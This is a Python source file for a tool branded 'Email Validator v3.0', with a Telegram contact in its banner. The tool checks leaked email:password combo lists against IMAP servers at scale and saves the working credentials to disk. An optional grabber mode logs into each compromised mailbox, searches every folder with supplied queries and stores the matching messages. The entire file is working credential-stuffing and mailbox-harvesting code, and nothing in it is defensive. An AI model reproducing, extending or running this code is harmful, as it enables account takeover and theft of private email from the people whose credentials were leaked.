#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Check Python version - Python 2 is NOT supported
import sys
if sys.version_info < (3, 0):
    print("=" * 60)
    print("ERROR: This script requires Python 3.x or higher")
    print("Python 2.x is NOT supported and will NOT work!")
    print("=" * 60)
    print("Current Python version: {}".format(sys.version))
    print("Please use 'python3' command instead of 'python'")
    print("=" * 60)
    sys.exit(1)

# Patch before importing socket, ssl or imaplib.
from gevent import monkey
monkey.patch_all()

import os
import time
from timeit import default_timer as timer
from datetime import datetime
import imaplib
import itertools
import argparse
import signal
import socket
import ssl
import email
import errno
import hashlib
import math
from checker_core import parse_line, check_imap

import gevent  # pip install gevent
from gevent.queue import *
from gevent.event import Event


def sub_worker(t):
    line, index = t
    address, password = line.split(':', 1)
    host = get_imapConfig(address)
    if not host and scan_unknow_host:
        host = ini_uh(address)
    if not host:
        result = 'unmatched'
        if invunma:
            q_unmatched.put(address)
    else:
        result = check_imap(address, password, host, time_out)
        if result == 'valid':
            q_valid.put(line)
            if grabactiv:
                grabberwrap((address, password), host)
        elif result == 'invalid' and invunma:
            q_invalid.put(address)
        elif result == 'error':
            q_errors.put(address)
    q_status.put((index, result))

# main consumer thread


def worker(worker_id):
    try:
        while not evt.is_set():
            try:
                task = q.get(block=True, timeout=2)
            except gevent.queue.Empty:
                break
            sub_worker(task)
    finally:
        send_sentinals()

#-----------------WRAPPERS-------------------------#

# Gets message and forwards to queue


def grabberwrap(task, host):
    for q in loaded_matchers:
        try:
            e = email_grabber(task[0], task[1], host, q)
            qd = q.split('|')[2].strip()
            if len(e):
                # print "Found",len(e),"messages."
                for mail in e:
                    q_grabbed.put((task, str(mail), qd))
        except BaseException:
            pass


#/-----------------WRAPPERS-------------------------#

#-----------------IMAP-------------------------#

# login via imap_ssl, uses imap query on all inboxes, returns emails
def email_grabber(a, b, host, q):
    if len(host) < 2:
        port = 993
    else:
        port = int(host[1])
    socket.setdefaulttimeout(time_out)
    quer = q.split('|')[0].strip()
    query = q.split('|')[1].strip()
    mail = imaplib.IMAP4_SSL(host[0], port, ssl_context=ssl.create_default_context())
    mail.login(a, b)
    rv, mailbox = mail.list()
    messages = []
    try:
        inboxes = [box.split(' ')[-1].replace('"', '') for box in mailbox
                   if box.split(' ')[-1].replace('"', '')[0].isalpha()]
    except BaseException:
        return []
    if len(inboxes) < 1:
        return
    for inbox in inboxes:
        try:
            # print inbox
            rv, data = mail.select(inbox)
            if rv == 'OK':
                result, data = mail.uid(quer, None, query)
                if data and data[0]:
                    uids_data = data[0]
                    if isinstance(uids_data, bytes):
                        uids_data = uids_data.decode('utf-8')
                    for uids in uids_data.split():
                        rv, email_data = mail.uid('fetch', uids, '(RFC822)')
                        if rv != 'OK':
                            continue
                        raw_email = email_data[0][1]
                        if isinstance(raw_email, bytes):
                            email_message = email.message_from_bytes(raw_email)
                        else:
                            email_message = email.message_from_string(raw_email)
                        messages.append(str(email_message))
                        if grabb_perfor:
                            if len(messages) > 0:
                                return messages

                    #for part in email_message.walk():
                        #if part.get_content_type() == "text/plain":  # ignore attachments/html
                            #body = part.get_payload(decode=True)
                            #messages.append(str(body))
                            #if grabb_perfor:
                                #if len(messages>0):
                                    #return messages

                        #else:
                            #continue
        except BaseException:
            pass
    return messages

# log in via imap_ssl, gives back true if valid


def imap(usr, pw, host):
    socket.setdefaulttimeout(time_out)
    usr = usr.lower()
    try:
        if len(host) < 2:
            port = 993
        else:
            port = int(host[1])
        mail = imaplib.IMAP4_SSL(str(host[0]), port)
        a = str(mail.login(usr, pw))
        return a[2: 4]
    except imaplib.IMAP4.error:
        return False
    except BaseException:
        return "Error"

#/-----------------IMAP-------------------------#


#------GETUNKNOWN--HOST--------------------------#
def getunknown_imap(subb):
    socket.setdefaulttimeout(time_out)
    try:
        sub = [
            'imap',
            'mail',
            'pop',
            'pop3',
            'imap-mail',
            'inbound',
            'mx',
            'imaps',
            'smtp',
            'm']
        for host in sub:
            host = host + '.' + subb
            try:
                # Test connection without login to discover IMAP host
                mail = imaplib.IMAP4_SSL(str(host), ssl_context=ssl.create_default_context())
                mail.logout()
                return host
            except (imaplib.IMAP4.error, socket.error, Exception):
                continue
    except BaseException:
        return None


def ini_uh(address):
    domain = address.rsplit('@', 1)[-1]
    host = getunknown_imap(domain)
    return (host, 993) if host else False

#/------GETUNKNOWN--HOST--------------------------#

#---------------HELPERS-------------------------#


def make_sure_path_exists(path):
    try:
        os.makedirs(path)
    except OSError as exception:
        if exception.errno != errno.EEXIST:
            raise

# gets imap setting from dic


def get_imapConfig(email):
    try:
        hoster = email.lower().split('@')[1]
        return ImapConfig[hoster]
    except BaseException:
        return False

# send sentinal values to writer queues


def send_sentinals():
    q_status.put("SENTINAL")
    q_valid.put("SENTINAL")
    if invunma:
        q_invalid.put("SENTINAL")
        q_unmatched.put("SENTINAL")
    if grabactiv:
        q_grabbed.put("SENTINAL")
    q_errors.put("SENTINAL")

# set event to trigger sential sending


def handler(signum, frame):
    print("\n[INFO]Shutting down gracefully (takes a while)")
    evt.set()

# read in blocks for better speed


def blocks(files, size=65536):
    while True:
        b = files.read(size)
        if not b:
            break
        yield b


def transform(expression):
    # Python 3 compatibility: compiler module removed
    # This function may not be used, but kept for compatibility
    if hasattr(expression, 'node'):
        return transform(expression.node)
    elif isinstance(expression, tuple):
        return tuple(transform(item) for item in expression)
    elif isinstance(expression, (str, int, float, bool, type(None))):
        return expression
    else:
        return str(expression) if expression != 'NIL' else None

# get last line value from file generated when shutting down


def get_lastline():
    try:
        with open("last_line.log", "r", encoding='utf-8') as text_file:
            for line in text_file:
                if int(line.strip()) < 1:
                    return 0
                else:
                    return int(line.strip())
    except BaseException:
        return 0

#/---------------HELPERS-------------------------#

#-----------LOADERS------------------------------#

# loading lines from file, putting them into q


def loader():
    """Read records without ever rewriting the user's source file."""
    global par1
    par1 = get_lastline() if resumer else 0
    skipped = 0
    with open(file_in, "r", encoding='utf-8-sig') as text_file:
        for line_num, line in enumerate(text_file):
            record = parse_line(line)
            if record is None:
                if line.strip() and not line.lstrip().startswith('#'):
                    skipped += 1
                continue
            if line_num >= par1:
                q.put((record[0] + ':' + record[1], line_num))
    print("[INFO] Skipped {} malformed line(s); input was not modified.".format(skipped), flush=True)


# load imap queries from file #Yes, its racy and nobody cares ;-)
def init_matchers():
    global loaded_matchers, grabactiv
    loaded_matchers = []
    try:
        with open(file_match, "r", encoding='utf-8') as text_file:
            loaded_matchers = [line.strip() for line in text_file
                               if len(line.strip()) > 1]
            if len(loaded_matchers) < 1:
                print("No matchers in", file_match)
                grabactiv = False

    except BaseException:
        print("[ERROR] Could not load any matchers, no file provided.")

# load Imap settings from file


def init_ImapConfig():
    global ImapConfig
    ImapConfig = {}
    try:
        with open("hoster.dat", "r", encoding='utf-8', errors='ignore') as f:
            for line in f:
                if len(line) > 1:
                    try:
                        hoster = line.strip().split(':')
                        if len(hoster) >= 3:
                            ImapConfig[hoster[0]] = (hoster[1], hoster[2])
                    except:
                        continue
    except BaseException as e:
        print("[ERROR] hoster.dat not found or error:", str(e))

#/-----------LOADERS------------------------------#

#---------------WRITERS---------------------------#

# writing valid lines to disk


def writer_valid():
    try:
        global timestamp_output_folder
        valid_path = os.path.join(timestamp_output_folder, "mail_pass_valid.txt")
        # Folder for emails with passwords (valid only)
        valid_with_pass_folder = os.path.join(timestamp_output_folder, "valid_with_passwords")
        make_sure_path_exists(valid_with_pass_folder)
        valid_with_pass_path = os.path.join(valid_with_pass_folder, "mail_pass_valid_with_password.txt")
        
        with open(valid_path, "a", encoding='utf-8') as f, open(valid_with_pass_path, "a", encoding='utf-8') as f_pass:
            sen_count = workers
            while True:
                t = q_valid.get(block=True)
                if t == "SENTINAL":
                    sen_count -= 1
                    if sen_count < 1:
                        q_isp_sorter.put("SENTINAL")
                        break
                else:
                    # t is the full line (email:password or email:)
                    email_line = str(t).rstrip("\r\n")
                    
                    # Extract email only (without password)
                    if ':' in email_line:
                        email_only = email_line.split(':')[0]
                    else:
                        email_only = email_line
                    
                    # Write email only to mail_pass_valid.txt
                    f.write(email_only + "\n")
                    f.flush()
                    
                    # Write full email:password to valid_with_passwords folder
                    # Only write if password exists (not just email:)
                    if ':' in email_line and len(email_line.split(':', 1)[1]) > 0:
                        f_pass.write(email_line + "\n")
                    else:
                        # If no password, write email only
                        f_pass.write(email_only + "\n")
                    f_pass.flush()
                    
                    # Also send email only to ISP/boite sorter
                    q_isp_sorter.put(email_only)
    except BaseException:
        pass

# writing invalid lines to disk


def writer_invalid():
    if invunma:
        try:
            global timestamp_output_folder
            invalid_path = os.path.join(timestamp_output_folder, "mail_pass_invalid.txt")
            with open(invalid_path, "a", encoding='utf-8') as f:
                sen_count = workers
                while True:
                    t = q_invalid.get(block=True)
                    if t == "SENTINAL":
                        sen_count -= 1
                        if sen_count < 1:
                            break
                    else:
                        # Extract email only (without password)
                        email_line = str(t)
                        if ':' in email_line:
                            email_only = email_line.split(':')[0]
                        else:
                            email_only = email_line
                        f.write(email_only + "\n")
        except BaseException:
            pass

# writing unmachted lines to disk (disabled - not saving to file)


def writer_addresses(queue, filename):
    """Persist addresses only, never passwords, for results needing attention."""
    with open(os.path.join(timestamp_output_folder, filename), 'w', encoding='utf-8') as output:
        remaining = workers
        while remaining:
            item = queue.get()
            if item == "SENTINAL":
                remaining -= 1
            else:
                output.write(item.split(':', 1)[0] + "\n")


def writer_unmatched():
    writer_addresses(q_unmatched, 'mail_unmatched.txt')


def writer_errors():
    writer_addresses(q_errors, 'mail_errors.txt')


# writing emails sorted by ISP/boite


def writer_isp_sorter():
    try:
        make_sure_path_exists("isp+boite")
        isp_files = {}  # Dictionary to store file handles for each ISP/boite
        sen_count = 1  # writer_valid forwards its sentinel after all addresses
        while True:
            t = q_isp_sorter.get(block=True)
            if t == "SENTINAL":
                sen_count -= 1
                if sen_count < 1:
                    # Close all file handles
                    for f in isp_files.values():
                        f.close()
                    break
            else:
                # Extract ISP/boite from email (part after @)
                try:
                    email_line = str(t)
                    if ':' in email_line:
                        email_part = email_line.split(':')[0]
                    else:
                        email_part = email_line
                    
                    if '@' in email_part:
                        isp_boite = email_part.split('@')[1].strip().lower()
                        # Create filename for this ISP/boite
                        filename = os.path.join("isp+boite", "mail_{}.txt".format(isp_boite))
                        
                        # Open file if not already open
                        if filename not in isp_files:
                            isp_files[filename] = open(filename, "a", encoding='utf-8')
                        
                        # Write email only (without password)
                        isp_files[filename].write(email_part + "\n")
                        isp_files[filename].flush()  # Ensure data is written
                except BaseException:
                    pass
    except BaseException:
        pass

# writing grabbed emails to disk


def writer_grabber():
    if grabactiv:
        try:
            sen_count = workers
            while True:
                t = q_grabbed.get(block=True)
                if t == "SENTINAL":
                    sen_count -= 1
                    if sen_count < 1:
                        break
                else:
                    with open((file_in[:-4]+"_grabbed_" +str(t[2]) + ".txt"), "a", encoding='utf-8') as ff:
                              ff.write(str(t[0][0])+":"+str(t[0][1])+"\n")
                    if grabb_perfor == False:
                        path = "grabbed_"+file_in[:-4]+"/"+str(t[2])+"/"+str(t[0])+"/"
                        make_sure_path_exists(path)
                        hash_object = hashlib.sha1(str(t[1]).encode('utf-8'))
                        hex_dig = hash_object.hexdigest()
                        with open(path+str(hex_dig)+".elp", "w", encoding='utf-8') as f:
                            f.write(str(t[1]))
        except BaseException:
            pass

# getting line count and interating progressbar with it
# writing last line to file


def state():
    global total_valid_count
    remaining = workers
    counts = {'valid': 0, 'invalid': 0, 'error': 0, 'unmatched': 0}
    # A checkpoint must not skip a slow in-flight record.
    while remaining:
        item = q_status.get()
        if item == "SENTINAL":
            remaining -= 1
            continue
        index, result = item
        counts[result] += 1
        print("[PROGRESS] valid={valid} invalid={invalid} error={error} unmatched={unmatched}".format(**counts), flush=True)
    total_valid_count = counts['valid']
    # Legacy resume files used a maximum completed index, which could skip work.
    # Do not write a new checkpoint from unordered results.

#/---------------WRITERS---------------------------#


# gevent async logic, spawning consumer greenlets
def asynchronous():
    # Create timestamp folder once at start
    global timestamp_output_folder
    make_sure_path_exists("M-P-V-I")
    timestamp_folder = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    timestamp_output_folder = os.path.join("M-P-V-I", timestamp_folder)
    make_sure_path_exists(timestamp_output_folder)
    print("[INFO] Output folder: {}".format(timestamp_output_folder))
    
    threads = []
    threads.append(gevent.spawn(loader))
    for i in range(0, workers):
        threads.append(gevent.spawn(worker, i))
    threads.append(gevent.spawn(writer_valid))
    threads.append(gevent.spawn(writer_isp_sorter))
    threads.append(gevent.spawn(writer_errors))
    threads.append(gevent.spawn(state))
    if invunma:
        threads.append(gevent.spawn(writer_invalid))
        threads.append(gevent.spawn(writer_unmatched))
    if grabactiv:
        threads.append(gevent.spawn(writer_grabber))
    start = timer()
    gevent.joinall(threads, raise_error=True)
    end = timer()
    print("[INFO]Time elapsed: " + str(end - start)[:5], "seconds.")
    # Display valid count
    try:
        print("[INFO] Valid emails: {}".format(total_valid_count))
    except:
        print("[INFO] Valid emails: 0")
    print("[INFO] Done.")
    evt.set()  # cleaning up


# Set UTF-8 encoding for Windows console
if sys.platform == 'win32':
    try:
        sys.stdout.reconfigure(encoding='utf-8')
    except AttributeError:
        # Python < 3.7 or older Windows
        import codecs
        sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, 'strict')

print("""
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║     ███████╗███╗   ███╗ █████╗ ██╗██╗     ██╗            ║
║     ██╔════╝████╗ ████║██╔══██╗██║██║     ██║            ║
║     █████╗  ██╔████╔██║███████║██║██║     ██║            ║
║     ██╔══╝  ██║╚██╔╝██║██╔══██║██║██║     ██║            ║
║     ███████╗██║ ╚═╝ ██║██║  ██║██║███████╗███████╗       ║
║     ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝       ║
║                                                           ║
║           ██╗   ██╗ █████╗ ██╗     ██╗██████╗            ║
║           ██║   ██║██╔══██╗██║     ██║██╔══██╗           ║
║           ██║   ██║███████║██║     ██║██║  ██║           ║
║           ╚██╗ ██╔╝██╔══██║██║     ██║██║  ██║           ║
║            ╚████╔╝ ██║  ██║███████╗██║██████╔╝           ║
║             ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝╚═════╝            ║
║                                                           ║
║                  Email Validator v3.0                    ║
║                                                           ║
║                    Telegram: @werlist99                  ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
""")
parser = argparse.ArgumentParser(description='Email Validator')
parser.add_argument(
    '-i',
    '--input',
    help="Inputfile",
    required=False,
    type=str,
    default="input.txt")
parser.add_argument(
    '-o',
    '--output',
    help='Outputfile',
    required=False,
    type=str,
    default="mail_pass_valid.txt")
parser.add_argument(
    '-t',
    '--threads',
    help='Number of Greenlets spawned',
    required=False,
    type=int,
    default=10)
parser.add_argument(
    '-iu',
    '--invunma',
    help='Log invalid an unmatched accounts.',
    required=False,
    type=lambda value: value.lower() in ("true", "1", "yes"),
    default=True)
parser.add_argument(
    '-g',
    '--grabber',
    help='Grab for matchers.',
    required=False,
    type=lambda value: value.lower() in ("true", "1", "yes"),
    default=False)
parser.add_argument(
    '-ga',
    '--grabball',
    help='Grabball emails',
    required=False,
    type=lambda value: value.lower() in ("true", "1", "yes"),
    default=False)
parser.add_argument(
    '-mf',
    '--matchfile',
    help='File with matchers..',
    required=False,
    type=str,
    default="matchers.dat")
parser.add_argument(
    '-to',
    '--timeout',
    help='timeout in sec',
    required=False,
    type=float,
    default=10)
parser.add_argument(
    '-r',
    '--resume',
    help='Resume from last line?',
    required=False,
    type=lambda value: value.lower() in ("true", "1", "yes"),
    default=False)
# Progressbar will be initialized by counting \n in a file,
# if file to big its too costly to count, hence disable when needed
parser.add_argument(
    '-b',
    '--big',
    help='Performance mode for big files',
    required=False,
    type=lambda value: value.lower() in ("true", "1", "yes"),
    default=False)
parser.add_argument(
    '-uh',
    '--unknownhosts',
    help='Check for unknown hosts',
    required=False,
    type=lambda value: value.lower() in ("true", "1", "yes"),
    default=False)
parser.add_argument(
    '-gper',
    '--grabperformance',
    help='Grabs but does not save emails',
    required=False,
    type=lambda value: value.lower() in ("true", "1", "yes"),
    default=False)


# parsing arguments
args = vars(parser.parse_args())

file_in = args['input']
file_out = args['output']
workers = args['threads']
invunma = args['invunma']
grabactiv = args['grabber']
file_match = args['matchfile']
time_out = args['timeout']
resumer = args['resume']
p_mode = args['big']
scan_unknow_host = args["unknownhosts"]
grabb_all = args["grabball"]
grabb_perfor = args["grabperformance"]

if workers < 1 or workers > 100 or not math.isfinite(time_out) or time_out <= 0:
    parser.error("threads must be between 1 and 100 and timeout must be positive")
if resumer:
    parser.error("resume is disabled because old checkpoints could skip accounts; run without -r")
if not os.path.isfile(file_in):
    parser.error("input file does not exist: {}".format(file_in))

# registering an event and signal handler

evt = Event()
signal.signal(signal.SIGINT, handler)

# init ressources

init_ImapConfig()
if grabactiv:
    init_matchers()

# init of queues
# Global variable for timestamp output folder
timestamp_output_folder = None
# Global variable for valid count
total_valid_count = 0

q = gevent.queue.Queue(maxsize=250000)  # loader
q_valid = gevent.queue.Queue()  # valid
q_status = gevent.queue.Queue()  # status
q_errors = gevent.queue.Queue()  # connection failures
q_isp_sorter = gevent.queue.Queue()  # ISP/boite sorter
if invunma:
    q_invalid = gevent.queue.Queue()  # invalid
    q_unmatched = gevent.queue.Queue()  # unmatched
if grabactiv:
    q_grabbed = gevent.queue.Queue()  # grabbed

# starting main logic

asynchronous()
